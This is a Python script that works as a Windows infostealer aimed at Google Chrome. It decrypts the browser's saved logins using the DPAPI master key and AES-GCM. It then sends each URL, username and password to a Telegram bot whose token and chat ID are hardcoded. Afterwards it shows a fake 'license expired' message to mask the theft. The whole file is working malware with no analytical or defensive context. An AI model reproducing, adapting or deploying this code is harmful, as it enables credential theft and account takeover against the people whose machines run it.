import os
import json
import base64
import sqlite3
import shutil
import requests
import platform
import tempfile
from Cryptodome.Cipher import AES
import win32crypt

if platform.system() != "Windows":
    raise SystemExit()

BOT_TOKEN = os.getenv("BOT_TOKEN", "7628788257:AAFZ_tDI96EXIdy5zAUh5uDahhlyLPAxTcg")
CHAT_ID = os.getenv("CHAT_ID", "7791491387")

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    max_length = 4000
    for i in range(0, len(message), max_length):
        part = message[i:i + max_length]
        data = {"chat_id": CHAT_ID, "text": part}
        try:
            response = requests.post(url, data=data)
            response.raise_for_status()
        except:
            pass

def fake_license_display():
    message = "⚠️ Lisensi Expired! Silakan perbarui lisensi Anda di: t.me/siberpoIri"
    send_telegram_message(message)
    raise SystemExit("License Expired! Please renew your license at t.me/siberpoIri")

def get_master_key():
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
    try:
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except:
        return None

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "GAGAL_DEKRIPSI"

def steal_passwords():
    login_db_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(login_db_path):
        return

    temp_db = os.path.join(tempfile.gettempdir(), "tmp_login_data.db")
    try:
        shutil.copy2(login_db_path, temp_db)

        key = get_master_key()
        if not key:
            return

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        result = ""
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if url and username and encrypted_password:
                password = decrypt_password(encrypted_password, key)
                result += f"🌐 {url}\n👤 {username}\n🔑 {password}\n\n"

        conn.close()

        if result:
            send_telegram_message("🛠️ Chrome Passwords:\n\n" + result)

    except:
        pass
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

if __name__ == "__main__":
    try:
        steal_passwords()
        fake_license_display()
    except SystemExit as e:
        raise
    except:
        fake_license_display()